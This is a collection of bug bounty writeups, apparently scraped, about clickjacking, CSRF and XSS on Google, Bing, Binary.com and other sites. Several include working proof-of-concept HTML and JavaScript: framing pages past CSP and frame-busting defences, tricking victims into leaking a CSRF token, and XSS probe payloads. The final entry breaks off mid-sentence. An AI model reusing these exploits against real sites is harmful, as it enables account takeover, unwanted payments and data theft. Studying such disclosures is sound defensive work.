{"source_url": "https://apapedulimu.click/clickjacking-on-google-myaccount-worth-7500/", "title": "Clickjacking on Google MyAccount Worth 7,500$ – Apapedulimu", "friendly_explanation": "This is a bug bounty writeup from https://apapedulimu.click/clickjacking-on-google-myaccount-worth-7500/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nClickjacking on Google MyAccount Worth 7,500$ – Apapedulimu Skip to content Apapedulimu Personal Blog – Portfolio Menu and widgets Home Contact Me About Me Hall Of Fame Publication Search for: Clickjacking on Google MyAccount Worth 7,500$ Recently, I got surprised from google, I found bug Clickjacking On Google My account. And they reward me 7,500$ for single bug. Amazing, right?. This bug I’ve found on March 2018, but the clickjacking is just blocked by CSP, and on August, I’ve found way to bypass it. Actually, I’ve been research on business.google.com subdomain and look around, just dummies touching the feature. See the respond and request. Try a stupid thing, edit the parameter, etc. And when I want to manage the user is redirect me to myaccount.google.com which is place where I found the bug. I look at my Lovely Community Edition of Burp Suite, There’s no header X-Frame-Option on it. At that time, I use Firefox ESR, I craft simple html just to iframe the page. And success, report them, but not applicable. Because on Firefox Quantum, Say Blocked By CSP, Clickjacking Blocked By CSP on Modern Browser Sad to hear that, but I realize I just too noob. So, It’s okay. I leave my research on google until August 15th. I try to look around again on my previous research. With more focus and of course my black coffee. I try to understand the code work. I realize if the CSP rule is reflected from my request parameter. I found it on business.google.com , so the parameter of the host is business.google.com. URL : https://myaccount.google.com/u/0/brandaccounts/group/101656179839819660704/managers?originProduct=AC&origin=https://business.google.com And the respond is : I realize if host just accept from business.google.com on origin parameter. So, I think the only way to execute it just from business.google.com . But, I try to edit parameter the origin to https://akugalau.business.google.com . It’s accepted! But, It’s impossible to use that subdomain. Hmmmm, Okay, The csp still here, And I can’t do nothing, right? Do, I must give up? Come on, It’s a big company and I ? Just little kid with the broken heart story 🙁 SAD! But, I have a lot free time to do stupid thing, right? So, I just adding illegal character on the origin parameter. I try to put URL Encode before the business.google.com. Become like this : https://myaccount.google.com/u/0/brandaccounts/group/101656179839819660704/managers?originProduct=AC&origin=https://%0d.business.google.com And the CSP is disappear , w000tttttt!!!!?!@?#!@?3!@?3? I try to iframe that And, I success to perform the clickjacking :’ . My condition is between not believe this and happy. If you ask me where the logic from adding the url encode on that. I dont understand :’ , I just lucky kid. I make report quickly and submit to google. After 1 month, I just expected it’s worth 3,133.7 or 5,000. But, the google give me bigger bounty, they give me 7,500$ . What ! I dont know what i suppose to say. :’ , I dont believe it because I just noob kid. PoC Code : <iframe src=” https://myaccount.google.com/u/0/brandaccounts/group/{your-group-id}/managers?originProduct=AC&origin=https://%0d.business.google.com ” width=”1000″ height=”1000″> Attack Scenario : 1. Admin invite new user on group-id 2. New user will accept the invitation 3. New user know the {your-group-id} 4. New user create a malicious page including this clickjacking to trick admin make the new user account to the owner 5. The group is takeover by the user. Video : Timeline : Aug 11 : Report to Google Aug 15 : Google Staff Ask Detail Aug 15 : Adding Detail Aug 21 : Google Can’t Prove Bug Aug 21 : Give them Video to PoC Aug 28 : Google Ask About Attack Scenario Aug 28 : Give the Attack Scenario Sep 11 : Nice Catch! Sep 25 : Bounty 7,500$ Sep 25 : I Cry. And also, Big thanks to all Indonesia Bug Hunter Community, Who has been teach me a lot about Bug Bounty and the ethical of bug hunter. Get in touch with me on twitter : LocalHost31337 Published by apapedulimu Urip Kui Urup View all posts by apapedulimu Posted on November 11, 2018 Author apapedulimu Tags Clickjacking , Google 3 thoughts on “Clickjacking on Google MyAccount Worth 7,500$” Fray says: November 15, 2018 at 4:22 pm Buat makan berapa tahun tuh Reply Munir says: January 14, 2019 at 11:45 am Sorry before, if I wrong, from what I read about your article and watched your video on youtube, actually you got $7500 because you can show google menu accout dialog into iframe? Am I right? Reply Rafi says: February 22, 2019 at 9:25 am It’s not just like that, it’s about bypassing CSP and XSS, and that’s worth to pay for Reply Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Website Notify me of follow-up comments by email. Notify me of new posts by email. Δ Post navigation Previous Previous post: Exploiting XSS in POST requests on semrush.com Next Next post: Multiple Stored XSS On Tokopedia Proudly powered by WordPress"}
{"source_url": "https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40", "title": "Bypass CSRF With ClickJacking Worth $1250 | by Saad Ahmed | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBypass CSRF With ClickJacking Worth $1250 | by Saad Ahmed | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Bypass CSRF With ClickJacking Worth $1250 Saad Ahmed 2 min read · Jul 16, 2019 -- Listen Share Hello friends, I hope you all are doing well, so this write up is all about how I chained the two different vulnerabilities to update the victim account details. Let’s assume the website name is redacted.com So when I visited the profile page https://redacted.com/editinfo/ & tried to change the account details there was a CSRF token I tried different methods to bypass that CSRF protection but failed, then I found the suspicious endpoint that was disclosing the CSRF token https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/ So when I opened that endpoint I found the CSRF token in the response, Now the next part was to steal the CSRF token & then I found out that there was no protection from the click jacking I created an HTML + JS Script to exploit the CSRF in just 1 Click <!DOCTYPE html> <html> <head> <title></title> </head> <body> <center><h1 style=”color: blue; text-decoration: underline;”>Lucky Draw to Win a $100</h1></center> <h3>Click inside the box and Press CTRL+A then CTRL+C</h3> <div style=”border: 2px solid gray;”> <iframe src=” https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/ \" width=”100%” style=”opacity: 0\"></iframe> </div> <h3>Click inside the box and press CTRL+V</h3> <input type=”password” name=”” size=”1\"> <br> <button id=”btn”>Click to Win</button> <div style=”display: none;”> <form action=”” method=”POST”> <input type=”hidden” name=”addrid” value=”12741305\" /> <input type=”hidden” name=”uname” value=” hack@gmail.com ” /> <input type=”hidden” name=”issendmsg” value=”1\" /> <input type=”hidden” name=”display” value=”” /> <input type=”hidden” name=”sendtype” value=”update” /> <input type=”hidden” name=”firstname” value=”accountinfo” /> <input type=”hidden” name=”lastname” value=”HACKED” /> <input type=”hidden” name=”country” value=”US” /> <input type=”hidden” name=”reglang” value=”en&#95;US” /> <input type=”hidden” name=”postcode” value=”1337\" /> <input type=”submit” value=”Submit request” /> </form> </div> </body> <script> document.querySelector(“#btn”).onclick = function() { var token = document.querySelector(“input”).value var form = document.querySelector(“form”) token = JSON.parse(token) var mapInput = document.createElement(“input”); mapInput.type = “hidden”; mapInput.name = “auth_token”; mapInput.value = token.Value; form.appendChild(mapInput) form.action = ` https://redacted.com/editInfo` form.submit(); alert(“Congratulation! You have won $100”) } </script> </html> Press enter or click to view image in full size So when the victim pastes the api response in the field & clicks on CLICK TO WIN. The js code will append the input field in form with the CSRF token that i got from victim & made request to update the account details & Boom it worked. I hope you like it ./LOGOUT JavaScript -- -- Written by Saad Ahmed 636 followers · 1 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@osamaavvan/1800-worth-clickjacking-1f92e79d0414", "title": "$1800 worth Clickjacking. In this writeup, I will talk about how… | by Osama Avvan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@osamaavvan/1800-worth-clickjacking-1f92e79d0414. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n$1800 worth Clickjacking. In this writeup, I will talk about how… | by Osama Avvan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in $1800 worth Clickjacking Osama Avvan 2 min read · Jun 21, 2019 -- 3 Listen Share In this writeup, I will talk about how I earned a total of $1800 by exploiting Clickjacking on pages where User sensitive information was disclosed, It was a private program on Bugcorwd. So there were some API endpoints, which were disclosing User Information like Credit Card Data, Email, Name, Phone, Address, User Id, etc. https://example.com/api/v1/wallet/payments?language=en https://example.com/api/v1/profile/personal https://example.com/api/v1/wallet/address/shipping https://www.example.com/no-cache/profileSystem/getProfile Now as there was no X-FRAME Header on any of these endpoints so I was able to load them in an IFRAME. Now I had to create an HTML page to trick the user into stealing their Information. So I created an HTML page. Press enter or click to view image in full size HTML CODE <!DOCTYPE html> <html> <head> <title></title> </head> <body> <div id=”parent”> <center><h1 style=”color: blue; text-decoration: underline;”>Lucky Draw to Win $100</h1></center> <h3>Click inside the box and Press CTRL+A then CTRL+C</h3> <div style=”border: 2px solid gray;”> <iframe src=”https://example.com/api/v1/wallet/payments?language=en\" width=”100%” style=”opacity: 0.01\"></iframe> </div> <h3>Click inside the box and press CTRL+V</h3> <input type=”password” name=”” size=”1\"> <! — <textarea rows=”1\" cols=”1\" style=”resize: none;”></textarea> → <br> <button id=”btn”>Click to Win</button> </div> </body> <script> document.querySelector(“#btn”).onclick = function() { console.log(document.querySelector(“input”).value) alert(“Congratulation! You have won $100”) } </script> </html> Now after performing all the steps when the user will click on the Button, his/her information will be logged in the console. Press enter or click to view image in full size So that was it, Thank you for Reading. JavaScript Bug Bounty Bugcrowd Security Researchers -- -- 3 Written by Osama Avvan 1.1K followers · 0 following Security Researcher, ❤️ To Code. Find me at: https://twitter.com/osamaavvan Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@ameerassadi/binary-com-clickjacking-vulnerability-exploiting-html5-security-features-368c1ff2219d", "title": "Binary.com ClickJacking Vulnerability — Exploiting HTML5 Security Features | by Ameer Assadi | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ameerassadi/binary-com-clickjacking-vulnerability-exploiting-html5-security-features-368c1ff2219d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBinary.com ClickJacking Vulnerability — Exploiting HTML5 Security Features | by Ameer Assadi | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Binary.com ClickJacking Vulnerability — Exploiting HTML5 Security Features Ameer Assadi 3 min read · Jul 28, 2018 -- Listen Share Are you aware of any (private) bug bounty programs? I would love to get an invite. Please get in touch with me: ameerassadime[at]gmail[.]com Introduction: Modern Web Applications nowadays are relaying on a lot of technologies where typical web applications vulnerabilities are hard to find (eg. Clickjacking is an ABC security bug) but bug hunters are always the best! Binary.com is one of the oldest and most respected names in online binary trading, Using Binary.com, customers can trade currencies, indices, stocks and commodities 24/7. Binary.com is owned and operated by the Binary Ltd. group of companies. In the UK and Isle of Man, clients trade through Binary (IOM) Ltd. In the European Union (except UK), they trade through Binary (Europe) Ltd and Binary Investments (Europe) Ltd. In the rest of the world, they trade through Binary (C.R.) S.A. The bug: While Doing Pentesting/BugHunting I aslo love to test subdomains not only the mine site so i started testing ticktrade.binary.com subdomain and found that’s not protected against clickjacking vulnerability neither with the typical “X-Frame-Options” nor with the JS frame busting technique that means a malicious attacker capable of iframing the whole service and tricking the end-users to perform unwanted actions! So I have Reported this vulnerability to Binary.com with this PoC: <html> <body> <iframe src=\"https://ticktrade.binary.com/\" width=600 height=400> <p>Your browser does not support iframes.</p> </iframe> </body> </html> then i got this reply from security team in the same day and after two day’s i received reply that the issue has been fixed. i’m always love to bypass the resolved issue, now comes the fun bit. i started looking how the security team fixed this vulnerability i mean if the vulnerability patched by adding X-Frame-Options or using JS frame busting technique and got it, the team uses JS frame busting technique to patch this vulnerability so let’s see how i bypassed this patch by Exploiting HTML5 Security Features Sandboxed Iframes What is Sandboxed iframes? The sandbox attribute enables an extra set of restrictions for the content in the iframe. When the sandbox attribute is present, and it will: Treat the content as being from a unique origin Block form submission block script execution Disable APIs Prevent links from targeting other browsing contexts Prevent content from using plugins through <embed>, <object>, <applet> , or other Prevent the content to navigate its top-level browsing context Block automatically triggered features (such as automatically playing a video or automatically focusing a form control) Attack Scenario : Iframing the Settings page or any other sensitive page with a sandboxed iframe to prevent redirecting to top window and allow scripts to be running, fooling the users to do unwanted actions. the final bypassing PoC: <html> <body> <iframe sandbox=\"allow-modals allow-scripts allow-forms allow-popups allow-same-origin\" src=\"http://ticktrade.binary.com\" width=600 height=400> <p>Bypassed By @AmeerAssadi.</p> </iframe> </body> </html> Reward: Binary Security Team rewarded me with a bounty and added my name on there Hall of Fame page , Thanks Binary! Timeline Monday, 23rd May 2016 — Issue Reported Monday, 23rd May 2016 — Issue Confirmed & Triaged Wednesday, 25th May 2016 — Issue Resolved and team asks me to verify the fix Wednesday, 25th May 2016 — Patch bypass sent Wednesday, 8th June 2016 — Issue Patched Bug Bounty Html5 Security Application Security Web Application Security -- -- Written by Ameer Assadi 90 followers · 7 following Application Security Engineer @Wix.com, AmeerAssadi.com No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@abaykandotcom/clickjacking-on-google-cse-6636bba72d20", "title": "I Found Clickjacking on Google CSE. Is This Important? | by Akbar Kustirama | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@abaykandotcom/clickjacking-on-google-cse-6636bba72d20. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nI Found Clickjacking on Google CSE. Is This Important? | by Akbar Kustirama | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in I Found Clickjacking on Google CSE. Is This Important? Akbar Kustirama 2 min read · Feb 10, 2019 -- 1 Listen Share While i was testing i found that cse.google.com is vulnerable to clickjacking so i checked if the settings page is vulnerable or not and it was vulnerable so now this has a risk! The attacker could delete someone’s CSE. Press enter or click to view image in full size Summary: Attacker can delete victim’s CSE. Steps to reproduce: Go to https://cse.google.com/ It can be embedded into any webpage. Attacker may manipulate HTML template so it can delete victim’s CSE. I wrote an exploit code for clickjacking and here is the exploit code: <center> <div style=\"position: absolute; left: 100px; top: 10px;\"><h3>Let's consider this is a game!</h3></div> <div style=\"position: absolute; left: 100px; top: 40px;\"><h3>To finish it, you have to press the keys in sequence.</h3></div> <div style=\"position: absolute; left: 205px; top: 278px; color: red;\"><button>1</button></div> <div style=\"position: absolute; left: 300px; top: 178px; color: red;\"><button>2</button></div> <div style=\"position: absolute; left: 400px; top: 475px; color: red;\"><button>3</button></div> <iframe style=\"opacity: 1; border: 0; position: fixed; top: 0px; left: 0px;\" src=\"https://cse.google.com/\" width=\"100%\" height=\"100%\"></iframe> By using Clickjacking technique, an attacker can make someone unconsciously delete their CSE. About how attacker can make someone unconsciously delete their CSE, you can check my video POC here: Enough about the explanation. Okay, the problem has just begun. My findings above, in my opinion are valid bugs. Why? Because the attacker can delete someone’s data (CSE), isn’t this a bug? But the response I got was very surprising. Press enter or click to view image in full size Press enter or click to view image in full size The part that makes me confused is, how is this not a bug? Because in my head it is clear that I can delete other people’s data. What do you think? Is this a bug? Or is it just me who overestimates this as a bug? This article already published in dev.to . Clickjacking Bug Bounty Google Hacking Writeup -- -- 1 Written by Akbar Kustirama 68 followers · 10 following Part-time pangrok, part-time hekermen, full-time pura-pura pinter. Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://samcurry.net/the-12000-intersection-between-clickjacking-xss-and-denial-of-service/", "title": "The $12,000 Intersection between Clickjacking, XSS, and Denial of Service", "friendly_explanation": "This is a bug bounty writeup from https://samcurry.net/the-12000-intersection-between-clickjacking-xss-and-denial-of-service/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe $12,000 Intersection between Clickjacking, XSS, and Denial of Service ‹ Back Introduction \"Digging Deep\" into Chat: Denial of Service against User Clients - $2,000 bounty What about pasting links to the same domain? Some time later... How could this be weaponized? \"Digging Deep\" into Chat: XSS plus Click Jacking - $10,000 bounty Conclusion ‹ Back The $12,000 Intersection between Clickjacking, XSS, and Denial of Service Wed Jul 04 2018 One of the more challenging tasks in web app pentesting is approaching an application that has limited interaction. It's very easy to give up after trying every common method to exploit something, but putting in the time to understand an application is often rewarding and beneficial to ones personal growth as a hacker. Introduction The specific application that I've been targeting over the last few weeks is a bitcoin gambling website where a stock will progressively rise over time. The gambler decides the amount of money they would like to put in and a multiplier to payout at. As the multiplier goes up, they have an option to click a button and receive whatever returns they had made it to. Each time the multiplier goes up, there is a chance the stock will \"bust\" and all of the investment will be lost. The application had a few really interesting functionalities, but the one I really wanted to spend time on was the ability to chat with other users. \"Digging Deep\" into Chat: Denial of Service against User Clients - $2,000 bounty One of the things that I had identified after scrolling through the chat messages was that the service auto-created hyperlinks when a link was pasted. This was interesting since the website made a really special HTML element that is oftentimes dangerously implemented so that an attacker could do one of the following... < a href = \":1\" > :2 </ a > \" onmouseover=alert(1) a=\" - this would fire at :1 if not sanitized properly javascript:alert(1) - this would fire at :1 if not sanitized properly <script>alert(1)</script> - this would fire at :2 if not sanitized properly Sadly, none of these worked. It appeared that the service did not hyperlink the external endpoints directly, but modified it to the following endpoint where www.google.com would be an example posted URL... https://www.bustabit.com/external?url=https://www.google.com ...the result of posting a URL... ... the page that you're taken to after clicking said URL. What about pasting links to the same domain? We'll come back to the above endpoint shortly, but something interesting about the external forwarding service was that it did not forward URLs for the same domain. There was some sort of detection mechanism for determining if a URL was from the same site, e.g. www.bustabit.com/a would not trigger the domain to be modified to www.bustabit.com/external?url=www.bustabit.com/a since it was on the same domain. Here is the generated HTML for www.bustabit.com/a ... < a href = \"/a\" > www.bustabit.com/a </ a > ... compared to the generated HTML for www.google.com/a ... < a href = \"https://www.bustabit.com/external?url=https://www.google.com/a\" > https://www.google.com/a </ a > The really cool part about the above URL is that it's not hyperlinking the full domain, but simply the endpoint. What an attacker could potentially do here is abuse the functionality of double slashes for external resources using a payload like... https://www.bustabit.com//attacker.com/hacked ... to create ... < a href = \"//attacker.com/hacked\" > www.bustabit.com//attacker.com/hacked </ a > This worked! The following HTML is the exact same hyperlink above: //hacker.com/ Notice how it takes you to an external resource and not an endpoint on samcurry.net ? More information on this is available here: http://www.ietf.org/rfc/rfc2396.txt . This WOULD'VE WORKED as a bypass to the link filter, but this was an all-JavaScript application that was doing an onclick event to load the endpoint in the same tab since the domain was the exact same and it didn't have to refresh whatsoever. Damn! It's incredibly frustrating seeing your PoC HTML written in the client, hovering over a hyperlink with a link to whywontyouload.com , then clicking it and nothing happening. After investigating this for a bit I got really annoyed and worked to identify what exactly was happening when I clicked the URL. Some time later... After a long time endlessly spamming random payloads and attempting to find something that would take a user to an external domain, the website went gray. It turns out that I had actually broken my client by sending https://www.bustabit.com/%0t . The JavaScript didn't know how to handle this since the URL encoding for %0t did not decode to anything and simply failed the entire application (see here for more information regarding correct URL encoding). After refreshing the page I was amazed: my client was still broken. It turns out that the application pushed all hyperlinks to a JavaScript function automatically, and if there was a failed URL (e.g. had %0t ), the application would crash. How could this be weaponized? An attacker could direct message anyone placing a bet (this is public information - all live bets and wagers are in the upper right box) and it would crash the victims client, making them unable to cash out their bet. Additionally, an attacker could simply post a bad link to the main chat channel and disconnect everyone, making the game unplayable for a long period of time or cancelling the ability to interact for all users. \"Digging Deep\" into Chat: XSS plus Click Jacking - $10,000 bounty Remember that external endpoint I had posted above? It turns out that you could simply pass it a JavaScript URI and an attacker could execute JavaScript within the context of the application. These bugs always suck because they require you to convince someone to click something. One of the things you can do to make these PoCs better is to simply check if the website can be put inside of an <iframe> tag. If this is possible, then it would additionally be possible to create a clickjacking PoC using something like Samy Kamkar's quick jacking PoC generation tool . It turns out that the service was able to be placed inside of an <iframe> . With this, I generated an example PoC using that awesome little snippet of Click here to continue . Which, in a real world scenario, could look a little something like this... So, what can you do with XSS? Session takeover! It turns out that the web sockets session is stored within the local storage of your browser. An attacker could abuse the XSS to force the victim into making a call to an external service with their session information. An attacker could authenticate to the application by modifying their own secrets to the victims and authenticating to the service. Conclusion More often than not I see people approaching bug bounty with a very \"spray everything lightly\" methodology. This will probably work eventually, but the thing you have to keep in mind is that every one can download automated tools like aquatone or dirsearch. If you want to find vulnerabilities on things where there are thousands of other researchers, it is often your best bet to dig deep on certain functionalities. If you have any questions feel free to use the contact form above or simply follow me on Twitter ! Find me on: twitter : https://twitter.com/samwcyo discord : zlz RSS Twitter"}
{"source_url": "https://medium.com/bugbountywriteup/two-vulnerabilities-makes-an-exploit-xss-and-csrf-in-bing-cd4269da7b69", "title": "Two vulnerabilities makes an Exploit!! (XSS and CSRF in Bing) | by Sai Krishna Kothapalli | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/two-vulnerabilities-makes-an-exploit-xss-and-csrf-in-bing-cd4269da7b69. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nTwo vulnerabilities makes an Exploit!! (XSS and CSRF in Bing) | by Sai Krishna Kothapalli | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Two vulnerabilities makes an Exploit!! (XSS and CSRF in Bing) Sai Krishna Kothapalli 3 min read · Jun 10, 2016 -- 1 Listen Share Hello !! This post will be about my 4th and 5th valid bug reports I submitted to Microsoft. Open the Images in a new tab if you find them difficult to view. I took the screenshots in a 1080p screen. This time I have found a XSS and CSRF vulnerabilities in Bing . Bing images is testing 3 new features called Stream , Favorites , Trending which are still in beta. Bing Images So I was going through this and there is this option where you can search and directly add images to your favourites. It was cool, So I wanted to take a look at how it is implemented. When you click on the heart symbol after the image search, the image is added to your favourites. and the request looks like this It’s URL-Encoded. Once decoded it looks like this {“WriteNewCollection”:true,”query”:”lucianazogbi”,”mid”:”5689B0BFCDB0E64E595A3B6C2B7A0865A4DC236C”,”description”:”lucianazogbi”,”MediaUrl”:”https://beautifulgeniuses.files.wordpress.com/2015/01/lucianazogbi.jpg&#8221;,”SourceUrl”:”http://beautifulgeniuses.com/2015/01/14/lucianazogbi/&#8221;,”ThWidth”:300,”ThHeight”:300,”MediaWidth”:640,”MediaHeight”:640,”MD5″:”md5_5c6aa5d2768f0d2255dab627015da340″,”MediaFormat”:””,”ThumbnailId”:“OIP.M5c6aa5d2768f0d2255dab627015da340o2″,”CollectionType”:0,”ContentId”:”XGql0naP”} Interesting there is no CSRF token and there is no X-Requested-With : XMLHttpRequest header. Which means it is vulnerable to CSRF attacks. Another interesting thing is the webpage is displaying this data in the Favorites tab. Then why not try to inject some JavaScript there. I tried all the fields but none of them worked. When I almost gave hope I saw this. This link is vulnerable to XSS . It is accepting links javascript:code in the <a> href tag . So when I click on it. BAMN Our favourite popup. So, by sending the user to a single malicious site it is possible to compromise his account. If I have stopped after the CSRF I would have not found the XSS. So, by successfully combining 2 vulnerabilities we made an exploit to compromise Bing. I reported this to Microsoft and now it is fixed. Since, that feature is still in beta-testing they took more than 5 months to fix that in order to make it more secure. My name will be in the March 2016 Hall Of Fame. Thank you for reading. Peace :D Feel free to comment and give some suggestions. Originally published at kmskrishna.wordpress.com on June 10, 2016. Security Microsoft Bug Bounty Bing Hacking -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Sai Krishna Kothapalli 3.3K followers · 435 following Security Researcher | Indian | Alumnus, IIT Guwahati Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@raushanraj_65039/clickjacking-in-google-docs-and-voice-typing-feature-c481d00b020a", "title": "Clickjacking in Google Docs and Voice typing feature. | by Raushan Raj | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@raushanraj_65039/clickjacking-in-google-docs-and-voice-typing-feature-c481d00b020a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nClickjacking in Google Docs and Voice typing feature. | by Raushan Raj | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Clickjacking in Google Docs and Voice typing feature. Raushan Raj 1 min read · Oct 5, 2018 -- 1 Listen Share What is Clickjacking? Unknowingly performing some sensitive actions on a webpage embedded(mostly in iframes) in any webpage with different or same domain/subdomain. Google Docs page response doesn’t have x-frame-options headers i.e; it can be embedded into any other webpage. There is a feature called voice typing in google docs where the user can speak and type in google docs. Tools → VoiceTyping → Click to speak I have created a public google doc and embed it in an iframe into my webpage with allow microphone. <iframe src=” https://docs.google.com/document/d/1VIhSkvFKar2bwHjORiI3GPT2wYWZ10P7QP42FpLrxY0/edit \" allow=”microphone *” ></iframe> An attacker can then share the webpage with the victim and can record private conversations of the victim (with the help of few clicks). Bounty: 2337$ Googlevrp Bug Bounty Clickjacking -- -- 1 Written by Raushan Raj 445 followers · 23 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@raushanraj_65039/google-clickjacking-6a04132b918a", "title": "Clickjackings in Google worth 14981.7$ | by Raushan Raj | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@raushanraj_65039/google-clickjacking-6a04132b918a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nClickjackings in Google worth 14981.7$ | by Raushan Raj | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Clickjackings in Google worth 14981.7$ Raushan Raj 4 min read · Mar 6, 2018 -- 6 Listen Share Instead of going for Cross Site Scripting, Remote Code Execution, SQL Injection, etc. I decided to find clickjacking in google and facebook. Clickjacking is one of the lowest paid, mostly out of the scope and underestimated vulnerability by organisations. What is Clickjacking ? Unknowingly performing some sensitive actions on a webpage embedded(mostly in iframes) in any webpage with different or same domain/subdomain. A. Clickjacking in Google’s play store payment page. 5000$ Steps to reproduce: 1. Attack url is is https://play.google.com/store/epurchase?dp=null&hl=en&docId=subs:com.google.android.apps.docs:r1.100gb&usegapi=1&id=I2_1505755312332&parent=https://www.google.com 2. When we add this url to <iframe src >there is an csp error : “Refused to display ‘ https://play.google.com/store/epurchase?dp=null&hl=en&docId=subs:com.google ….docs:r1.100gb&usegapi=1&id=I2_1505755312332&parent= https://www.google.com ' in a frame because an ancestor violates the following Content Security Policy directive: “frame-ancestors ‘self’ https://*. google.com https://*. googleusercontent.com https://editionsatplay.withgoogle.com https://livecase.withgoogle.com \".\" 3. But “*. google.com ” is allowed. 4. Go to play.google.com and add some amount > 200 INR using google play recharge code. 5. Go to sites.google.com and create new site, there is an iframe option to insert. add URL given in step 1 to iframe src. 6. For POC i have included it in ( https://sites.google.com/site/conceptofmathematicsnow/ ). The page get embedded . Just by one click on subscribe ,amount (130 rs ) will get deducted and you will get subscribed to 100gb drive unknowingly. Attack scenario: Clickjacking on page lead to deduct amount from google play wallet and subscribe user to google drive upgrade 1.) Attacker will embed “ https://play.google.com/store/epurchase?dp=null&hl=en&docId=subs:com.google.android.apps.docs:r1.100gb&usegapi=1&id=I2_1505755312332&parent=https://www.google.com \" in any sites.google.com site like “ https://sites.google.com/site/conceptofmathematicsnow/ \" (here we can add javascript plugins) 2.) When user visit https://sites.google.com/site/conceptofmathematicsnow/ , and unknowingly click just one button (subscribe).Money will get deducted and he will be subscribed. Press enter or click to view image in full size B. Clickjacking in https://payments.google.com/ using google’s open redirection vulnerability. 3133.7 $ Steps to reproduce: 1. <iframe height=”1200px” width=”1200px” src=” https://www.google.com/url?sa=D&q=https://payments.google.com/payments&usg=AFQjCNGnO25JhaC9l_zIK-Is46SusuQRsQ \"></iframe> 2. The url in iframe src , will make “ https://www.google.com/url \" as a referer to payments.google.com page. 3. Once there is valid referer , the X-Frame-Options Header Vanishes Browser/OS: Chrome / Firefox Attack scenario: It’s making whole payments.google.com pages/tabs clickjackable. With few user interactions 1.) Attacker can close victim’s payment account 2.) Can add his account to manage victim’s account. 3.) Can Change payment profile details C. Clickjacking in https://docs.google.com/picker . 1337$ Steps to reproduce: 1. Go to youtube there is upload button and “Import your videos from Google Photos” , On clicking this video picker will open and url for the same is : https://docs.google.com/picker?protocol=gadgets&origin=https%3A%2F%2Fwww.youtube.com&hostId=yt-upload-importer&hl=en_GB&title&actions=picked%2Ccancel%2Cloaded%2Creceived%2CviewContentRendered&mineOnly=true&multiselectEnabled=true&shadeDialog=true&horizNav=true&maxItems=300&relayUrl=https%3A%2F%2Fwww.youtube.com%2F%2Fs.ytimg.com%2Fyts%2Ffavicon-vflz7uhzw.ico&pp=%5B%5B%22album%22%2C%7B%7D%5D%5D&nav=((%22photos%22%2C%22All%20Videos%22%2C%7B%22type%22%3A%22videos-uploaded%22%2C%22svm%22%3Atrue%2C%22rdv%22%3Atrue%7D)%2C(%22photos%22%2C%22Auto%20Backup%22%2C%7B%22type%22%3A%22videos-camerasync%22%2C%22svm%22%3Atrue%7D)%2C(%22photos%22%2C%22Albums%22%2C%7B%22selectAlbum%22%3Atrue%7D))&rpctoken=tppfn9l0d0ug&rpcService=40cmfpboj50i 2. A.) There is a request parameter origin= https://www.youtube.com and response header x-frame-options:ALLOW-FROM https://www.youtube.com B.) When we set origin= https://anything.com , there will be error page and x-frame-options: https://anything.com C.) When we set origin= https://sites.google.com , there will be error page and x-frame-options: https://sites.google.com D.)When we set origin= https://beta.sites.google.com , PICKER appears and NO error page and x-frame-options: https://beta.sites.google.com in response header same is the case for https://googledrive.com This means we can embed the video picker on https://beta.sites.google.com . E.) https://beta.sites.google.com/site/conceptofmathematicsnow/ : here i have uploaded the same in iframe. https://beta.sites.google.com/site/conceptofmathematicsnow/ Browser/OS: Firefox, Chrome Attack scenario: Clickjacking the button can convert user’s private/public videos to public on youtube Press enter or click to view image in full size D. Clickjacking in Google Sites(New) Setting Page. 1337$ Clickjacking Lead to deleting the google sites (trashed) Steps to reproduce: 1. As X-FRAME OPTIONS 